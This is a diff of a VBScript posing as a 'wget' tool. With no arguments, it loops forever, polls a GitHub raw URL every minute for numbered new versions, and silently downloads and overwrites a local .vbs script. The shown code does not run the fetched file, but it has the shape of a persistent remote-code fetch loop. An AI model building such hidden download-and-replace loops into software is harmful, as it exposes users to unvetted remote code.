@@ -1,11 +1,12 @@
-Dim wGetArgs, WshShell, strCurDir, xHttp, bStrm, appVersion, appUrl, addVersion
+Dim wGetArgs, WshShell, strCurDir, xHttp, bStrm, appVersion, appUrl, addVersion, fileName
 	Set wGetArgs = WScript.Arguments
 	Set WshShell = CreateObject("WScript.Shell")
 	strCurDir    = WshShell.CurrentDirectory
-	addVersion = 6 'change Version change file name too 
+	addVersion = 4 'change Version change file name too 
 	appVersion =  "wget_v1." & addVersion
 	appUrl = "https://raw.githubusercontent.com/Parrot-cyber/contact/main/" & appVersion
-	
+	fileName = "\wget.vbs"
+
 	function FileExists(FilePath)
 		Set fso = CreateObject("Scripting.FileSystemObject")
 		If Not fso.FileExists(FilePath) Then
@@ -15,43 +16,38 @@ Dim wGetArgs, WshShell, strCurDir, xHttp, bStrm, appVersion, appUrl, addVersion
 		end If
 	end function
 
-	function checkUrl(url)
-			Set o = CreateObject("MSXML2.XMLHTTP")
-			on error resume next
-			o.open "GET", url, False
-			o.send
-			if o.Status = 404 then checkUrl = o.Status
-			on error goto 0 
+	function checkUrl(chkurl)
+		Set o = CreateObject("MSXML2.XMLHTTP")
+		on error resume next
+		o.open "GET", chkurl, False
+		o.send
+		if o.Status = 404 then checkUrl = o.Status
+		on error goto 0 
+	end function
+	
+	function downLoad(dldurl)
+		fileName = "\" & appVersion & ".vbs"
+		Set xHttp = createobject("Microsoft.XMLHTTP")
+		Set bStrm = createobject("Adodb.Stream")
+		xHttp.Open "GET", dldurl, False
+		xHttp.Send
+		with bStrm
+			.type = 1 '//binary
+			.open
+			.write xHttp.responseBody
+			.savetofile strCurDir & fileName , 2 '//overwrite
+		end with 
 	end function
 	
 	if WScript.Arguments.Count = 0 then
 		Do while True:
-		
 			if checkUrl(appUrl) = 404 then
 				addVersion = addVersion + 1
 				appVersion =  "wget_v1." & addVersion
 				appUrl = "https://raw.githubusercontent.com/Parrot-cyber/contact/main/" & appVersion
-				Set xHttp = createobject("Microsoft.XMLHTTP")
-				Set bStrm = createobject("Adodb.Stream")
-				xHttp.Open "GET", appUrl, False
-				xHttp.Send
-				with bStrm
-					.type = 1 '//binary
-					.open
-					.write xHttp.responseBody
-					.savetofile strCurDir & "\wget.vbs", 2 '//overwrite
-				end with
-			elseif FileExists(strCurDir & "\wget.vbs") Then
-				Set xHttp = createobject("Microsoft.XMLHTTP")
-				Set bStrm = createobject("Adodb.Stream")
-				xHttp.Open "GET", appUrl, False
-				xHttp.Send
-				with bStrm
-					.type = 1 '//binary
-					.open
-					.write xHttp.responseBody
-					.savetofile strCurDir & "\wget.vbs", 2 '//overwrite
-				end with
+				downLoad(appUrl)
+			elseif FileExists(strCurDir & fileName) Then
+				downLoad(appUrl)
 			end if
 			WScript.Sleep(60000)
 		loop
@@ -69,3 +65,4 @@ Dim wGetArgs, WshShell, strCurDir, xHttp, bStrm, appVersion, appUrl, addVersion
 			.savetofile strCurDir & "\" & dstName, 2 '//overwrite
 		end with
 	end if
+
